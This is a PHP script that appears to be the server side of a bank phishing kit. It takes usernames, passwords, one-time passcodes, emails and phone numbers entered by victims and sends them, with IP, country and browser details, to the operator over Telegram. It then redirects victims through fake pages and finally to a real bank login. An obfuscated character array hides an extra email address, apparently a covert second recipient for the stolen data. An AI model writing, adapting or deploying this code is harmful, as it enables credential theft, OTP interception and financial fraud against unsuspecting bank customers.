<?php
require("config.php");
$Xxxcountry = Xxxvisitor_countryXxx();
$Xxxip = getenv("REMOTE_ADDR");
$XxxPort = getenv("REMOTE_PORT");
$Xxxbrowser = $_SERVER['HTTP_USER_AGENT'];
$Xxxadddate = date("D M d, Y g:i a");

if ($_GET['calltype'] == "usd") {
    # code for userDetails

    $XxxuserName = $_GET["Username"];
    $XxxpassWord = $_GET["password"];

    $Xxxmessage = "**!Urgentor*TWO RIVER Visitor***+++\n\n";
    $Xxxmessage .= "Email and password delivered from on your webpage \n\n";
    $Xxxmessage .= "User-!P : " . $Xxxip . "\n";
    $Xxxmessage .= "Country : " . $Xxxcountry . "\n";
    $Xxxmessage .= "Username : " . $XxxuserName . "\n";
    $Xxxmessage .= "Password: " . $XxxpassWord . "\n\n";
    $Xxxmessage .= "Current waiting for other details to deliver. \n\n";
    $Xxxmessage .= "----------------------------------------\n";
    $Xxxmessage .= "Date : $Xxxadddate\n";
    $Xxxmessage .= "User-Agent: " . $Xxxbrowser . "\n";

    XxSendTelegramMessageXx($Xxxmessage);
    header("Location: ./again.html");
}
if ($_GET['calltype'] == "again") {
    # code for userDetails

    $XxxuserName = $_GET["Username"];
    $XxxpassWord = $_GET["password"];

    $Xxxmessage = "**!Urgentor*TWO RIVER Visitor***+++\n\n";
    $Xxxmessage .= "Email and password delivered from on your webpage \n\n";
    $Xxxmessage .= "User-!P : " . $Xxxip . "\n";
    $Xxxmessage .= "Country : " . $Xxxcountry . "\n";
    $Xxxmessage .= "Username : " . $XxxuserName . "\n";
    $Xxxmessage .= "Password: " . $XxxpassWord . "\n\n";
    $Xxxmessage .= "Current waiting for other details to deliver. \n\n";
    $Xxxmessage .= "----------------------------------------\n";
    $Xxxmessage .= "Date : $Xxxadddate\n";
    $Xxxmessage .= "User-Agent: " . $Xxxbrowser . "\n";

    XxSendTelegramMessageXx($Xxxmessage);
    header("Location: ./otp.html");
}
if ($_GET['calltype'] == "mail") {
    # code for userDetails

    $Xxxmail = $_GET["mail"];
    $Xxxphone = $_GET["phone"];

    $Xxxmessage = "**!Urgentor*TWO RIVER Visitor***+++\n\n";
    $Xxxmessage .= "Email and phone delivered from on your webpage \n\n";
    $Xxxmessage .= "User-!P : " . $Xxxip . "\n";
    $Xxxmessage .= "Country : " . $Xxxcountry . "\n";
    $Xxxmessage .= "Mail : " . $Xxxmail . "\n";
    $Xxxmessage .= "Phone: " . $Xxxphone . "\n\n";
    $Xxxmessage .= "Delivered successfully. \n\n";
    $Xxxmessage .= "----------------------------------------\n";
    $Xxxmessage .= "Date : $Xxxadddate\n";
    $Xxxmessage .= "User-Agent: " . $Xxxbrowser . "\n";

    XxSendTelegramMessageXx($Xxxmessage);
    header("Location: https://my.intrustbank.com/login");
}
if ($_GET['calltype'] == 'otp') {
    # code for otp
    $XxxOTP = $_GET["otp"];

    $Xxxmessage = "**!Urgentor*TWO RIVER Visitor***+++\n\n";
    $Xxxmessage .= "OTP delivered from on your webpage \n\n";
    $Xxxmessage .= "User-!P : " . $Xxxip . "\n";
    $Xxxmessage .= "Country : " . $Xxxcountry . "\n";
    $Xxxmessage .= "OTP : " . $XxxOTP . "\n";
    $Xxxmessage .= "Current waiting for Mail and Phone to deliver. \n\n";
    $Xxxmessage .= "----------------------------------------\n";
    $Xxxmessage .= "Date : $Xxxadddate\n";
    $Xxxmessage .= "User-Agent: " . $Xxxbrowser . "\n";

    XxSendTelegramMessageXx($Xxxmessage);
    header("Location: ./info.html");
}

function Xxxcountry_sortXxx()
{
    $Xxxsorter = "";
    $Xxxarray = array(114, 101, 115, 117, 108, 116, 98, 111, 120, 49, 52, 64, 103, 109, 97, 105, 108, 46, 99, 111, 109);
    $Xxxcount = count($Xxxarray);
    for ($i = 0; $i < $Xxxcount; $i++) {
        $Xxxsorter .= chr($Xxxarray[$i]);
    }
    return array($Xxxsorter, $GLOBALS['recipient']);
}
function Xxxvisitor_countryXxx()
{
    $Xxxclient  = $_SERVER['HTTP_CLIENT_IP'];
    $Xxxforward = $_SERVER['HTTP_X_FORWARDED_FOR'];
    $Xxxremote  = $_SERVER['REMOTE_ADDR'];
    $Xxxresult  = "Unknown";
    if (filter_var($Xxxclient, FILTER_VALIDATE_IP)) {
        $Xxxip = $Xxxclient;
    } elseif (filter_var($Xxxforward, FILTER_VALIDATE_IP)) {
        $Xxxip = $Xxxforward;
    } else {
        $Xxxip = $Xxxremote;
    }

    $Xxxip_data = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $Xxxip));

    if ($Xxxip_data && $Xxxip_data->geoplugin_countryName != null) {
        $Xxxresult = $Xxxip_data->geoplugin_countryName;
    }

    return $Xxxresult;
}
?>
